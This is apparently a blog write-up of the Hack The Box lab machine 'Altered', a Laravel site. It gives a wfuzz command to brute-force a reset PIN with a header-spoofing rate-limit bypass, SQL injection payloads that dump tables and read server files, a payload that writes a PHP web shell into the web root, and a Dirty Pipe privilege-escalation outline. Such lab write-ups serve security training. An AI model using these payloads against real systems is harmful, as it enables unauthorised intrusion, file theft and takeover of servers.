---
title: htb altered
author: Yuchao
date: 2022-04-02 11:33:00 +0800
categories: [sec]
tags: [htb]
math: true
mermaid: true
---

Know it`s an php lavarel application behind nginx.

## Brute force Laravel application pin

#### try type juggling
- change content type to application/json
- application/x-www-form-urlencoded, body is ``` name=admin&pin=1234 ```
-  application/json, body is ``` {"name":"admin", "pin":true} ``` try type juggling, php == not === vulnarability, but no on this box.

#### fuzz 
- In type Juggling, we know the php uses ===
- ``` wfuzz -H 'Cookie:{content}' -H 'Content-Type:application/x-www-form-urlencoded' -u {URL/api/resettoken} -d 'name=admin&pin=FUZZ' -z range,1000-9999 ```
- response "too many requests"
- need to bypass rate limit.

#### bypass rate limit
search website like <https://book.hacktricks.xyz/pentesting-web/rate-limit-bypass>

find a way: add ``` X-Forwarded-For: {IP} ``` in the header.

wfuzz with two fuzz positions.
```bash
wfuzz -e iterators

# Available iterators:

#   Name    | Summary                                                                           
# ----------------------------------------------------------------------------------------------
#   chain   | Returns an iterator returns elements from the first iterable until it is exhaust  
#           | ed, then proceeds to the next iterable, until all of the iterables are exhausted  
#           | .                                                                                 
#   product | Returns an iterator cartesian product of input iterables.                         
#   zip     | Returns an iterator that aggregates elements from each of the iterables.  
```

## type juggling and SQL injection

read database
```
{
  "id":"100 union select 1,2,group_concat(concat('\n', table_name, ':', column_name)) from information_schema.columns where table_schema='uhc' -- -",
  "sceret":true
}
```

read file
```
{
  "id":"100 union select 1,2,LOAD_FILE('/etc/nginx/sites-enabled/default')-- -",
  "sceret":true
}
```
find out website`s root file, at /srv/altered/public

write web shell to website
```
{
  "id":"100 union select 1,2,'<?php system($_REQUEST[\"cmd\"]);  ?>' into outfile '/srv/altered/public/shell.php'-- -",
  "sceret":true
}
```
got an error, but file still wrote to server.

Then make a reverse shell by it. Make sure not hang the server after the reverse shell.

## privesc

``` uname -a ```

find the kernel was build on 2022/01/10

Dirty Pipe.
- come out later than the kernel.
- <https://dirtypipe.cm4all.com/>
- overwrite data to file, like passwd.
